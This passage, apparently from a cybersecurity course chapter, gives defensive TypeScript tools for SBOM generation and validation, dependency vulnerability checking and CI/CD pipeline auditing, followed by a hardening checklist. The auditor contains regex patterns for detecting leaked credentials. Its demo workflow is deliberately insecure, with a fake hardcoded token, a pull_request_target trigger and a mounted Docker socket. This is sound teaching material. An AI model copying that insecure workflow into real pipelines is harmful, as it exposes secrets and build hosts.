      purl: `pkg:npm/${rootPkg.name}@${rootPkg.version}`,
    };

    if (rootPkg.license) {
      rootComponent.licenses = [{ license: { id: rootPkg.license } }];
    }

    const nodeModulesPath = path.join(this.projectRoot, 'node_modules');
    const components = this.scanNodeModules(nodeModulesPath);

    const allComponents = new Map(components);
    allComponents.set(rootComponent['bom-ref'], rootComponent);

    const dependencies = this.buildDependencyGraph(rootComponent, allComponents);

    const sbom: CycloneDXSBOM = {
      bomFormat: 'CycloneDX',
      specVersion: '1.5',
      serialNumber: `urn:uuid:${this.generateUUID()}`,
      version: 1,
      metadata: {
        timestamp: new Date().toISOString(),
        tools: [
          {
            vendor: 'Cybersecurity Course',
            name: 'CycloneDX SBOM Generator',
            version: '1.0.0',
          },
        ],
        component: rootComponent,
      },
      components: Array.from(allComponents.values()),
      dependencies,
    };

    return sbom;
  }

  private generateUUID(): string {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }
}

// ─── Usage ───
// const generator = new CycloneDXSBOMGenerator('/path/to/project');
// const sbom = generator.generate();
// fs.writeFileSync('bom.cyclonedx.json', JSON.stringify(sbom, null, 2));
// console.log(`SBOM generated with ${sbom.components.length} components`);
```

### 16.3.3 SBOM Validation

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-3-sbom-validation-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-3-sbom-validation-handwritten.svg" alt="Handwritten: 16.3.3 SBOM Validation" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-3-sbom-validation-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-3-sbom-validation-diagram.svg" alt="Diagram: 16.3.3 SBOM Validation" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-3-sbom-validation-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-3-sbom-validation-sticky.svg" alt="Sticky Note: 16.3.3 SBOM Validation" width="30%">
</a>


```typescript
/**
 * Validates a CycloneDX SBOM document for structural correctness
 * and semantic consistency.
 */

interface ValidationResult {
  valid: boolean;
  errors: string[];
  warnings: string[];
}

class CycloneDXValidator {
  validate(sbom: unknown): ValidationResult {
    const errors: string[] = [];
    const warnings: string[] = [];

    if (typeof sbom !== 'object' || sbom === null) {
      return { valid: false, errors: ['SBOM must be a non-null object'], warnings: [] };
    }

    const doc = sbom as Record<string, unknown>;

    // Required fields check
    if (doc.bomFormat !== 'CycloneDX') {
      errors.push('bomFormat must be "CycloneDX"');
    }

    if (!doc.specVersion || typeof doc.specVersion !== 'string') {
      errors.push('specVersion is required and must be a string');
    }

    if (!doc.serialNumber || typeof doc.serialNumber !== 'string') {
      errors.push('serialNumber is required');
    }

    if (typeof doc.version !== 'number' || doc.version < 1) {
      errors.push('version must be a positive integer');
    }

    // Metadata validation
    if (!doc.metadata || typeof doc.metadata !== 'object') {
      errors.push('metadata is required');
    } else {
      const metadata = doc.metadata as Record<string, unknown>;
      if (!metadata.component) {
        errors.push('metadata.component is required');
      }
    }

    // Components validation
    if (!Array.isArray(doc.components)) {
      errors.push('components must be an array');
    } else {
      const comps = doc.components as Array<Record<string, unknown>>;
      const bomRefs = new Set<string>();

      for (const [idx, comp] of comps.entries()) {
        if (!comp.type) errors.push(`components[${idx}]: type is required`);
        if (!comp['bom-ref']) errors.push(`components[${idx}]: bom-ref is required`);
        else if (bomRefs.has(comp['bom-ref'] as string)) {
          errors.push(`components[${idx}]: duplicate bom-ref "${comp['bom-ref']}"`);
        } else {
          bomRefs.add(comp['bom-ref'] as string);
        }
        if (!comp.name) errors.push(`components[${idx}]: name is required`);
        if (!comp.version) errors.push(`components[${idx}]: version is required`);
      }

      if (comps.length === 0) {
        warnings.push('SBOM contains no components');
      }
    }

    // Dependencies validation
    if (doc.dependencies !== undefined) {
      if (!Array.isArray(doc.dependencies)) {
        errors.push('dependencies must be an array');
      }
    }

    return {
      valid: errors.length === 0,
      errors,
      warnings,
    };
  }
}
```

---

## 16.4 Dependency Security Analysis

### 16.4.1 Dependency Vulnerability Checker (TypeScript)

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-1-dependency-vulnerability-checker-typescript-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-1-dependency-vulnerability-checker-typescript-handwritten.svg" alt="Handwritten: 16.4.1 Dependency Vulnerability Checker (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-1-dependency-vulnerability-checker-typescript-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-1-dependency-vulnerability-checker-typescript-diagram.svg" alt="Diagram: 16.4.1 Dependency Vulnerability Checker (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-1-dependency-vulnerability-checker-typescript-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-1-dependency-vulnerability-checker-typescript-sticky.svg" alt="Sticky Note: 16.4.1 Dependency Vulnerability Checker (TypeScript)" width="30%">
</a>


```typescript
/**
 * Dependency Vulnerability Checker
 *
 * Compares a project's dependencies against a local CVE database
 * to identify known vulnerabilities. In production, this would
 * connect to the NVD API or use a local OWASP Dependency Check DB.
 */

/* ─── Type Definitions ─── */

interface VulnerabilityRecord {
  id: string;
  packageName: string;
  affectedVersions: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  description: string;
  cvssScore: number;
  fixVersion: string | null;
}

interface DependencyEntry {
  name: string;
  version: string;
  type: 'direct' | 'transitive';
  path: string;
}

interface VulnerabilityResult {
  dependency: DependencyEntry;
  vulnerability: VulnerabilityRecord;
  isAffected: boolean;
  suggestedFix: string;
}

interface ScanReport {
  scannedAt: string;
  totalDependencies: number;
  totalVulnerabilities: number;
  results: VulnerabilityResult[];
  summary: {
    critical: number;
    high: number;
    medium: number;
    low: number;
  };
}

/* ─── Version Comparator ─── */

class VersionComparator {
  /**
   * Parse a semver string into its components.
   */
  private parse(version: string): { major: number; minor: number; patch: number; prerelease?: string } {
    const cleaned = version.replace(/^[v^~]/, '');
    const parts = cleaned.split(/[-+]/);
    const nums = parts[0].split('.').map(Number);

    return {
      major: nums[0] ?? 0,
      minor: nums[1] ?? 0,
      patch: nums[2] ?? 0,
      prerelease: parts[1],
    };
  }

  /**
   * Check if a version is within an affected range.
   * Supports simple range expressions like:
   * - ">=2.0.0 <2.15.0"
   * - "<1.0.0"
   * - "=2.14.1"
   * - "*" (all versions)
   */
  isAffected(version: string, affectedRange: string): boolean {
    const ver = this.parse(version);

    if (affectedRange === '*') return true;

    const parts = affectedRange.split(' ').filter(Boolean);
    for (let i = 0; i < parts.length; i += 2) {
      const op = parts[i];
      const targetVersion = parts[i + 1];
      if (!op || !targetVersion) continue;

      const target = this.parse(targetVersion);
      const matchesOp = this.compareVersions(ver, op, target);
      if (i === 0 && !matchesOp) return false;
      if (i > 0 && !matchesOp) return false;
    }

    return true;
  }

  private compareVersions(
    v: ReturnType<VersionComparator['parse']>,
    operator: string,
    target: ReturnType<VersionComparator['parse']>
  ): boolean {
    const majorDiff = v.major - target.major;
    const minorDiff = v.minor - target.minor;
    const patchDiff = v.patch - target.patch;

    const fullDiff = majorDiff !== 0 ? majorDiff : minorDiff !== 0 ? minorDiff : patchDiff;

    switch (operator) {
      case '>=': return fullDiff >= 0;
      case '<=': return fullDiff <= 0;
      case '>': return fullDiff > 0;
      case '<': return fullDiff < 0;
      case '=':
      case '==': return fullDiff === 0;
      default: return false;
    }
  }
}

/* ─── Vulnerability Checker ─── */

class DependencyVulnerabilityChecker {
  private readonly cveDatabase: VulnerabilityRecord[];
  private readonly versionComparator: VersionComparator;

  constructor(cveDatabase: VulnerabilityRecord[]) {
    this.cveDatabase = cveDatabase;
    this.versionComparator = new VersionComparator();
  }

  /**
   * Scan a list of dependencies against the CVE database.
   */
  scan(dependencies: DependencyEntry[]): ScanReport {
    const results: VulnerabilityResult[] = [];
    const summary = { critical: 0, high: 0, medium: 0, low: 0 };

    for (const dep of dependencies) {
      for (const vuln of this.cveDatabase) {
        if (vuln.packageName !== dep.name) continue;

        const isAffected = this.versionComparator.isAffected(
          dep.version,
          vuln.affectedVersions
        );

        if (isAffected) {
          summary[vuln.severity.toLowerCase() as keyof typeof summary]++;
          results.push({
            dependency: dep,
            vulnerability: vuln,
            isAffected: true,
            suggestedFix: vuln.fixVersion
              ? `Upgrade ${dep.name} from ${dep.version} to ${vuln.fixVersion}`
              : `No fix available. Consider replacing ${dep.name} with an alternative.`,
          });
        }
      }
    }

    return {
      scannedAt: new Date().toISOString(),
      totalDependencies: dependencies.length,
      totalVulnerabilities: results.length,
      results,
      summary,
    };
  }
}

// ─── Demonstration ───

const sampleCVE: VulnerabilityRecord[] = [
  {
    id: 'CVE-2021-44228',
    packageName: 'log4j-core',
    affectedVersions: '>=2.0.0 <2.15.0',
    severity: 'CRITICAL',
    description: 'Log4Shell RCE via JNDI lookup injection',
    cvssScore: 10.0,
    fixVersion: '2.15.0',
  },
  {
    id: 'CVE-2022-22965',
    packageName: 'spring-core',
    affectedVersions: '>=5.3.0 <5.3.18',
    severity: 'CRITICAL',
    description: 'Spring4Shell RCE via data binding',
    cvssScore: 9.8,
    fixVersion: '5.3.18',
  },
  {
    id: 'CVE-2023-25194',
    packageName: 'kafka-clients',
    affectedVersions: '>=3.0.0 <3.3.3',
    severity: 'HIGH',
    description: 'Kafka Connect RCE via JNDI injection',
    cvssScore: 8.1,
    fixVersion: '3.3.3',
  },
  {
    id: 'CVE-2024-3094',
    packageName: 'xz-utils',
    affectedVersions: '>=5.6.0 <5.6.1',
    severity: 'CRITICAL',
    description: 'xz backdoor — malicious code in upstream tarballs',
    cvssScore: 10.0,
    fixVersion: '5.6.1',
  },
];

const sampleDeps: DependencyEntry[] = [
  { name: 'log4j-core', version: '2.14.1', type: 'transitive', path: 'app > logging-lib > log4j-core' },
  { name: 'spring-core', version: '5.3.16', type: 'direct', path: 'node_modules/spring-core' },
  { name: 'kafka-clients', version: '3.3.4', type: 'direct', path: 'node_modules/kafka-clients' },
  { name: 'express', version: '4.18.2', type: 'direct', path: 'node_modules/express' },
];

const checker = new DependencyVulnerabilityChecker(sampleCVE);
const report = checker.scan(sampleDeps);

console.log(JSON.stringify(report, null, 2));
```

### 16.4.2 Transitive Dependency Risks

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-2-transitive-dependency-risks-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-2-transitive-dependency-risks-handwritten.svg" alt="Handwritten: 16.4.2 Transitive Dependency Risks" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-2-transitive-dependency-risks-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-2-transitive-dependency-risks-diagram.svg" alt="Diagram: 16.4.2 Transitive Dependency Risks" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-2-transitive-dependency-risks-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-4-2-transitive-dependency-risks-sticky.svg" alt="Sticky Note: 16.4.2 Transitive Dependency Risks" width="30%">
</a>


Transitive dependencies (dependencies of dependencies) represent a significant blind spot:

```typescript
/**
 * Analyzes transitive dependency depth and flags high-risk chains.
 */
interface DependencyNode {
  name: string;
  version: string;
  dependencies: DependencyNode[];
  depth: number;
}

class TransitiveDependencyAnalyzer {
  /**
   * Build a dependency tree from package.json and node_modules.
   */
  analyze(graph: DependencyNode, maxDepth: number = 10): string[] {
    const warnings: string[] = [];
    this.traverse(graph, new Set(), 0, maxDepth, warnings);
    return warnings;
  }

  private traverse(
    node: DependencyNode,
    visited: Set<string>,
    currentDepth: number,
    maxDepth: number,
    warnings: string[]
  ): void {
    const key = `${node.name}@${node.version}`;
    if (visited.has(key)) {
      warnings.push(
        `CYCLE DETECTED: "${node.name}@${node.version}" appears multiple times in dependency tree`
      );
      return;
    }

    if (currentDepth >= maxDepth) {
      warnings.push(
        `EXCESSIVE DEPTH: "${node.name}@${node.version}" at depth ${currentDepth} exceeds max ${maxDepth}`
      );
      return;
    }

    visited.add(key);

    for (const dep of node.dependencies) {
      this.traverse(dep, new Set(visited), currentDepth + 1, maxDepth, warnings);
    }
  }

  /**
   * Detect version conflicts (same package at different versions).
   */
  detectVersionConflicts(root: DependencyNode): Map<string, Set<string>> {
    const versionMap = new Map<string, Set<string>>();
    this.collectVersions(root, versionMap);

    const conflicts = new Map<string, Set<string>>();
    for (const [pkgName, versions] of versionMap) {
      if (versions.size > 1) {
        conflicts.set(pkgName, versions);
      }
    }
    return conflicts;
  }

  private collectVersions(
    node: DependencyNode,
    versionMap: Map<string, Set<string>>
  ): void {
    if (!versionMap.has(node.name)) {
      versionMap.set(node.name, new Set());
    }
    versionMap.get(node.name)!.add(node.version);

    for (const dep of node.dependencies) {
      this.collectVersions(dep, versionMap);
    }
  }
}
```

---

## 16.5 CI/CD Pipeline Hardening

Modern CI/CD pipelines are a prime target for attackers because they have access to source code, secrets, and production deployment credentials.

### 16.5.1 CI/CD Pipeline Security Architecture

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-1-ci-cd-pipeline-security-architecture-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-1-ci-cd-pipeline-security-architecture-handwritten.svg" alt="Handwritten: 16.5.1 CI/CD Pipeline Security Architecture" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-1-ci-cd-pipeline-security-architecture-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-1-ci-cd-pipeline-security-architecture-diagram.svg" alt="Diagram: 16.5.1 CI/CD Pipeline Security Architecture" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-1-ci-cd-pipeline-security-architecture-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-1-ci-cd-pipeline-security-architecture-sticky.svg" alt="Sticky Note: 16.5.1 CI/CD Pipeline Security Architecture" width="30%">
</a>


```mermaid
flowchart LR
    subgraph Source
        A[Git Repository]
    end
    subgraph CI_Pipeline["CI Pipeline — Security Gates"]
        B[SAST Scan]
        C[Secrets Scan]
        D[SBOM Generation]
        E[Dep. Scan]
        F[Container Scan]
    end
    subgraph Build
        G[Build & Sign]
        H[Provenance Attestation]
    end
    subgraph CD_Pipeline["CD Pipeline — Deployment Gates"]
        I[Artifact Verification]
        J[Policy Enforcement]
        K[Canary Deploy]
    end
    subgraph Production
        L[Production Environment]
    end

    A --> B
    B --> C
    C --> D
    D --> E
    E --> F
    F --> G
    G --> H
    H --> I
    I --> J
    J --> K
    K --> L

    style B fill:#4CAF50,color:#fff
    style C fill:#4CAF50,color:#fff
    style D fill:#2196F3,color:#fff
    style E fill:#4CAF50,color:#fff
    style F fill:#FF9800,color:#fff
    style G fill:#9C27B0,color:#fff
    style H fill:#9C27B0,color:#fff
    style I fill:#f44336,color:#fff
    style J fill:#f44336,color:#fff
```

**Figure 16.2**: CI/CD pipeline with integrated security gates at every stage.

### 16.5.2 CI/CD Pipeline Security Auditor (TypeScript)

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-2-ci-cd-pipeline-security-auditor-typescript-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-2-ci-cd-pipeline-security-auditor-typescript-handwritten.svg" alt="Handwritten: 16.5.2 CI/CD Pipeline Security Auditor (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-2-ci-cd-pipeline-security-auditor-typescript-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-2-ci-cd-pipeline-security-auditor-typescript-diagram.svg" alt="Diagram: 16.5.2 CI/CD Pipeline Security Auditor (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-2-ci-cd-pipeline-security-auditor-typescript-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-2-ci-cd-pipeline-security-auditor-typescript-sticky.svg" alt="Sticky Note: 16.5.2 CI/CD Pipeline Security Auditor (TypeScript)" width="30%">
</a>


```typescript
/**
 * CI/CD Pipeline Security Auditor
 *
 * Analyzes pipeline configuration files for common security misconfigurations.
 * Supports GitHub Actions (YAML), GitLab CI (.gitlab-ci.yml), and generic checks.
 */

/* ─── Type Definitions ─── */

type PipelineType = 'github-actions' | 'gitlab-ci' | 'jenkins' | 'generic';

interface PipelineConfig {
  type: PipelineType;
  rawContent: string;
  parsed?: Record<string, unknown>;
}

interface SecurityFinding {
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  category: string;
  rule: string;
  description: string;
  recommendation: string;
  line?: number;
}

interface AuditReport {
  pipelineType: PipelineType;
  scannedAt: string;
  findings: SecurityFinding[];
  summary: {
    critical: number;
    high: number;
    medium: number;
    low: number;
    info: number;
    passed: number;
  };
}

/* ─── Security Audit Rules ─── */

interface AuditRule {
  id: string;
  severity: SecurityFinding['severity'];
  category: string;
  description: string;
  recommendation: string;
  check: (config: PipelineConfig) => SecurityFinding[];
}

class CICDPipelineAuditor {
  private readonly rules: AuditRule[];

  constructor() {
    this.rules = this.initializeRules();
  }

  private initializeRules(): AuditRule[] {
    return [
      {
        id: 'GH-PINNED-ACTIONS',
        severity: 'HIGH',
        category: 'Supply Chain',
        description: 'GitHub Action is referenced without a commit SHA pin',
        recommendation: 'Pin actions to a full commit SHA instead of a version tag (e.g., uses: "actions/checkout@<sha>")',
        check: (config: PipelineConfig): SecurityFinding[] => {
          const findings: SecurityFinding[] = [];
          if (config.type !== 'github-actions') return findings;

          const lines = config.rawContent.split('\n');
          // Match patterns like `uses: some/action@v3`
          const actionRegex = /^\s+uses:\s+([^\s]+)@(v?\d+\.\d+\.\d+|\d+\.[\w-]+)$/gm;
          let match: RegExpExecArray | null;
          while ((match = actionRegex.exec(config.rawContent)) !== null) {
            const lineNo = lines.findIndex((l) => l.includes(match![0].trim())) + 1;
            findings.push({
              severity: 'HIGH',
              category: 'Supply Chain',
              rule: 'GH-PINNED-ACTIONS',
              description: `Action "${match[1]}@${match[2]}" is pinned to a mutable tag instead of a commit SHA`,
              recommendation: `Replace "${match[1]}@${match[2]}" with "${match[1]}@<full-commit-sha>"`,
              line: lineNo,
            });
          }

          return findings;
        },
      },
      {
        id: 'GH-CI-EVENTS',
        severity: 'MEDIUM',
        category: 'Workflow Triggers',
        description: 'CI workflow triggers on pull_request_target without explicit permission scoping',
        recommendation: 'Use `pull_request` instead of `pull_request_target`, or scope token permissions to minimum',
        check: (config: PipelineConfig): SecurityFinding[] => {
          const findings: SecurityFinding[] = [];
          if (config.type !== 'github-actions') return findings;

          if (
            config.rawContent.includes('pull_request_target') &&
            !config.rawContent.includes('permissions:')
          ) {
            findings.push({
              severity: 'MEDIUM',
              category: 'Workflow Triggers',
              rule: 'GH-CI-EVENTS',
              description: 'Workflow uses pull_request_target without explicit permission scoping',
              recommendation: 'Add a `permissions:` block with minimum required permissions, or switch to `pull_request`',
            });
          }

          return findings;
        },
      },
      {
        id: 'WRITE-TOKENS',
        severity: 'CRITICAL',
        category: 'Secrets Management',
        description: 'Pipeline uses write-scoped GITHUB_TOKEN unnecessarily',
        recommendation: 'Set `permissions: read-only` at the workflow level unless write access is explicitly needed',
        check: (config: PipelineConfig): SecurityFinding[] => {
          const findings: SecurityFinding[] = [];

          // Check for write permissions in deploy, release, or package publish jobs
          const writeScopes = ['contents: write', 'packages: write', 'id-token: write'];
          const hasWrite = writeScopes.some((scope) =>
            config.rawContent.toLowerCase().includes(scope)
          );

          const isDeployJob = /deploy|release|publish/i.test(config.rawContent);

          if (isDeployJob && !hasWrite) {
            // Deploy job without explicit permissions might default to write
            // — GitHub Actions defaults differ by trigger event
            if (config.rawContent.includes('pull_request_target')) {
              findings.push({
                severity: 'CRITICAL',
                category: 'Secrets Management',
                rule: 'WRITE-TOKENS',
                description: 'Deploy job on pull_request_target could expose write token to untrusted PRs',
                recommendation: 'Use separate workflows: one for PR checks (read-only) and one for deployment (write, trigger only on push to main)',
              });
            }
          }

          return findings;
        },
      },
      {
        id: 'SELF-HOSTED-RUNNER',
        severity: 'HIGH',
        category: 'Infrastructure',
        description: 'Pipeline uses self-hosted runners which may have persistent state',
        recommendation: 'Use ephemeral self-hosted runners (single-use) or GitHub-hosted runners',
        check: (config: PipelineConfig): SecurityFinding[] => {
          const findings: SecurityFinding[] = [];
          if (
            config.rawContent.includes('self-hosted') ||
            config.rawContent.includes('selfhosted') ||
            config.rawContent.includes('runs-on: [self')
          ) {
            const lines = config.rawContent.split('\n');
            const selfHostedLines = lines
              .map((line, idx) => (line.includes('self-hosted') ? idx + 1 : -1))
              .filter((l) => l !== -1);

            for (const lineNo of selfHostedLines) {
              findings.push({
                severity: 'HIGH',
                category: 'Infrastructure',
                rule: 'SELF-HOSTED-RUNNER',
                description: 'Pipeline uses self-hosted runners which may retain secrets between runs',
                recommendation: 'Use ephemeral containers for self-hosted runners, or switch to GitHub-hosted runners',
                line: lineNo,
              });
            }
          }
          return findings;
        },
      },
      {
        id: 'HARDCODED-SECRETS',
        severity: 'CRITICAL',
        category: 'Secrets Management',
        description: 'Pipeline configuration may contain hardcoded secrets',
        recommendation: 'Use CI/CD secrets management (GitHub Secrets, GitLab CI Variables, Jenkins Credentials)',
        check: (config: PipelineConfig): SecurityFinding[] => {
          const findings: SecurityFinding[] = [];
          const secretPatterns = [
            /(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}/g,        // GitHub tokens
            /(?:AKIA|ASIA)[A-Z0-9]{16}/g,                            // AWS Access Key
            /sk-[A-Za-z0-9]{32,}/g,                                   // OpenAI API key
            /-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/g,             // Private keys
            /(?:password|passwd|pwd)\s*[=:]\s*['"][^'"]+['"]/gi,    // Generic password
            /(?:api[_-]?key|apikey)\s*[=:]\s*['"][^'"]+['"]/gi,     // API keys
            /(?:secret|token)\s*[=:]\s*['"][^'"]+['"]/gi,           // Secrets/tokens
          ];

          for (const pattern of secretPatterns) {
            let match: RegExpExecArray | null;
            while ((match = pattern.exec(config.rawContent)) !== null) {
              findings.push({
                severity: 'CRITICAL',
                category: 'Secrets Management',
                rule: 'HARDCODED-SECRETS',
                description: `Potential hardcoded secret found: "${match[0].substring(0, 20)}..."`,
                recommendation: 'Move secrets to CI/CD secrets management system',
              });
            }
          }

          return findings;
        },
      },
      {
        id: 'NO-SBOM',
        severity: 'MEDIUM',
        category: 'Supply Chain',
        description: 'Pipeline does not generate an SBOM',
        recommendation: 'Add an SBOM generation step using Syft, CycloneDX CLI, or similar tool',
        check: (config: PipelineConfig): SecurityFinding[] => {
          const findings: SecurityFinding[] = [];
          const sbomKeywords = ['sbom', 'cyclonedx', 'spdx', 'syft', 'bom'];
          const hasSBOM = sbomKeywords.some((kw) =>
            config.rawContent.toLowerCase().includes(kw)
          );

          if (!hasSBOM) {
            findings.push({
              severity: 'MEDIUM',
              category: 'Supply Chain',
              rule: 'NO-SBOM',
              description: 'Pipeline does not appear to generate an SBOM for software artifacts',
              recommendation: 'Add an SBOM generation step using `syft`, `cyclonedx-bom`, or similar',
            });
          }

          return findings;
        },
      },
      {
        id: 'DOCKER-SOCK-MOUNT',
        severity: 'CRITICAL',
        category: 'Container Security',
        description: 'Docker socket is mounted in the CI runner, allowing container escape',
        recommendation: 'Use rootless Docker, or avoid binding /var/run/docker.sock',
        check: (config: PipelineConfig): SecurityFinding[] => {
          const findings: SecurityFinding[] = [];
          if (
            config.rawContent.includes('/var/run/docker.sock') ||
            config.rawContent.includes('docker.sock')
          ) {
            findings.push({
              severity: 'CRITICAL',
              category: 'Container Security',
              rule: 'DOCKER-SOCK-MOUNT',
              description: 'Docker socket is mounted, which allows container escape to host',
              recommendation: 'Use Docker-in-Docker (dind) with proper isolation, or avoid mounting the Docker socket',
            });
          }
          return findings;
        },
      },
    ];
  }

  /**
   * Run all audit checks against a pipeline configuration.
   */
  audit(config: PipelineConfig): AuditReport {
    const findings: SecurityFinding[] = [];

    for (const rule of this.rules) {
      try {
        const ruleFindings = rule.check(config);
        findings.push(...ruleFindings);
      } catch (error) {
        findings.push({
          severity: 'INFO',
          category: 'Audit Error',
          rule: rule.id,
          description: `Rule "${rule.id}" threw an error: ${error instanceof Error ? error.message : String(error)}`,
          recommendation: 'Review rule implementation',
        });
      }
    }

    const summary = {
      critical: findings.filter((f) => f.severity === 'CRITICAL').length,
      high: findings.filter((f) => f.severity === 'HIGH').length,
      medium: findings.filter((f) => f.severity === 'MEDIUM').length,
      low: findings.filter((f) => f.severity === 'LOW').length,
      info: findings.filter((f) => f.severity === 'INFO').length,
      passed: Math.max(0, this.rules.length - findings.length),
    };

    return {
      pipelineType: config.type,
      scannedAt: new Date().toISOString(),
      findings,
      summary,
    };
  }
}

// ─── Demonstration ───

const sampleWorkflow = `
name: Production Deploy
on:
  pull_request_target:
    branches: [main]
  push:
    branches: [main]

jobs:
  build-and-deploy:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '20'
      - run: npm install
      - run: npm run build
      # Docker socket mounted for build
      - run: docker build -t app .
        working-directory: .
        env:
          DOCKER_HOST: unix:///var/run/docker.sock
      - run: npm run deploy
        env:
          DEPLOY_KEY: ghp_abcdef123456789012345678901234567890
`;

const auditor = new CICDPipelineAuditor();
const report = auditor.audit({
  type: 'github-actions',
  rawContent: sampleWorkflow,
});

console.log('=== CI/CD Pipeline Audit Report ===');
console.log(`Pipeline Type: ${report.pipelineType}`);
console.log(`Scanned: ${report.scannedAt}`);
console.log(`\nSummary:`);
console.log(`  Critical: ${report.summary.critical}`);
console.log(`  High: ${report.summary.high}`);
console.log(`  Medium: ${report.summary.medium}`);
console.log(`  Low: ${report.summary.low}`);
console.log(`  Info: ${report.summary.info}`);
console.log(`  Passed: ${report.summary.passed}`);

console.log('\nFindings:');
for (const finding of report.findings) {
  console.log(`  [${finding.severity}] ${finding.rule}: ${finding.description}`);
  console.log(`    → ${finding.recommendation}`);
}
```

### 16.5.3 CI/CD Pipeline Hardening Checklist

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-3-ci-cd-pipeline-hardening-checklist-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-3-ci-cd-pipeline-hardening-checklist-handwritten.svg" alt="Handwritten: 16.5.3 CI/CD Pipeline Hardening Checklist" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-3-ci-cd-pipeline-hardening-checklist-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-3-ci-cd-pipeline-hardening-checklist-diagram.svg" alt="Diagram: 16.5.3 CI/CD Pipeline Hardening Checklist" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-3-ci-cd-pipeline-hardening-checklist-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-5-3-ci-cd-pipeline-hardening-checklist-sticky.svg" alt="Sticky Note: 16.5.3 CI/CD Pipeline Hardening Checklist" width="30%">
</a>


| # | Check | Priority | Pipeline Type |
|---|---|---|---|
| 1 | **Pin all actions to commit SHAs** — never use version tags | Critical | GitHub Actions |
| 2 | **Set minimum token permissions** — `permissions: read-all` at workflow level | Critical | GitHub Actions |
| 3 | **Use `pull_request` not `pull_request_target`** for untrusted forks | Critical | GitHub Actions |
| 4 | **Ephemeral runners only** — never reuse runners between builds | Critical | All |
| 5 | **No Docker socket mounts** — use dind or rootless Docker | Critical | All |
| 6 | **Secrets scanning pre-commit** — `trufflehog`, `gitleaks` | Critical | All |
| 7 | **SBOM generation per build** — CycloneDX or SPDX | High | All |
| 8 | **Artifact signing** — Cosign or GPG | High | All |
| 9 | **Dependency scanning** — `npm audit`, `snyk`, OWASP DC | High | All |
| 10 | **SAST integration** — CodeQL, Semgrep | High | All |
| 11 | **Container scanning** — Trivy, Grype | High | All |
| 12 | **No hardcoded secrets** — use CI secrets vault | Critical | All |
| 13 | **Separate build and deploy workflows** — principle of least privilege | High | All |
| 14 | **Provenance attestation** — in-toto + SLSA | Medium | All |
| 15 | **DAST for deployed artifacts** — ZAP, Burp Suite | Medium | All |
| 16 | **Signed commits and tags** — GPG or SSH commit signing | Medium | Git |
| 17 | **Branch protection rules** — require PRs, status checks, signed commits | Critical | Git |
